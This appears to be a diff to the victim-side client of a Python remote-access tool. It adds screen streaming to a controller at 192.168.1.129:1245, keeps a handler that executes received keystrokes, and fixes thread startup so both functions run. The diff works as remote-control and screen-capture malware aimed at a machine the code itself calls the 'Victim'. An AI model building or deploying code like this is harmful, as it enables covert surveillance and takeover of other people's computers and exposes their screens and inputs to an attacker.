@@ -1,6 +1,9 @@
 import socket
 import sys
 import threading
+
+from screen_mirroring.screen_stream import ScreenStream
+
 sys.path.append('..')
 
 from handelrs.keyboard_handelr import HandelKeyboard
@@ -24,16 +27,15 @@ class Victim:
                 HandelKeyboard.handel(packet_payload)
 
     def stream(self):
-        while self.connected:
-            pass
+        ScreenStream.transmit_frames(self.victim)
 
     def main(self):
 
         try:
             self.victim.connect(self.ADDR)
 
-            handel_thread = threading.Thread(target=self.handel())
-            stream_thread = threading.Thread(target=self.stream())
+            handel_thread = threading.Thread(target=self.handel)
+            stream_thread = threading.Thread(target=self.stream)
 
             handel_thread.start()
             stream_thread.start()
@@ -50,4 +52,4 @@ class Victim:
 
 
 if __name__ == '__main__':
-    Victim('127.0.0.1', 1245).main()
+    Victim('192.168.1.129', 1245).main()
